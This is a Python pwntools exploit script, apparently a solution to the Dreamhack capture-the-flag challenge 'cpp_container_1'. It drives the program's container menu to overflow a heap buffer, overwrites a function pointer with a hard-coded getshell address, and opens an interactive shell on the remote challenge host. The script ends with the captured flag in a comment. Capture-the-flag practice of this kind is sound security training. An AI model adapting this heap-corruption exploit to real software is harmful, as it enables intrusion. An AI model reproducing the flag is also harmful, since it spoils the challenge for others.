# Use the different functions to corrupt the container memory i think

from pwn import *
import time
getshell = p64(0x0000000000401041)

'''
attack path is make_container -> resize container to different sizes -> copy container to overwrite the function pointer?
the memory should be in a heap allocated buffer though?
so it's a heap exploit
where is the Menu object relative to the heap?
maybe something like resize -> make -> resize -> copy would work?
'''

LOCAL = False
if LOCAL:
    r = process('./cpp_container_1')  
else:
    r = remote('host3.dreamhack.games', 14260)

def make(v1e, v1o, v2, s1, s2):
    r.recvuntil(": ")
    r.sendline("1")
    l = r.recvline()
    print(l)
    count = 0
    for i in range(s1):
        l = r.recvuntil("input: ")
        print(l)
        if b'input: ' not in l:
            break
        else:
            if count % 2 == 0:
                print("Sending ", str(v1e))
                r.sendline(str(v1e))
            else:
                print("Sending ", str(v1o))
                r.sendline(str(v1o))
            count +=1

    for i in range(s2):
        l = r.recvuntil("input: ")
        print(l)
        if b'input: ' not in l:
            break
        else:
            print("Sending ", v2)
            r.sendline(str(v2))

def modify(s1, s2):
    r.sendlineafter(": ", "2")
    r.recvline()
    r.sendline(str(s1))

    r.recvline()
    r.sendline(str(s2))

def copy():
    r.sendlineafter(": ", "3")

def view():
    r.sendlineafter(": ", "4")

def main():
    """ modify(10, 3) """
    """ make("29", "3", 10, 3) """
    """ view() """
    modify(10, 3)
    make(0x401041, 0, 3, 10, 3)
    modify(10, 0)
    """ gdb.attach(r) """
    """ time.sleep(1) """
    copy()

    r.interactive()
    # Flag: DH{797c9c479e623eb790bd3ae646fb8440}

if __name__ == "__main__":
    main()
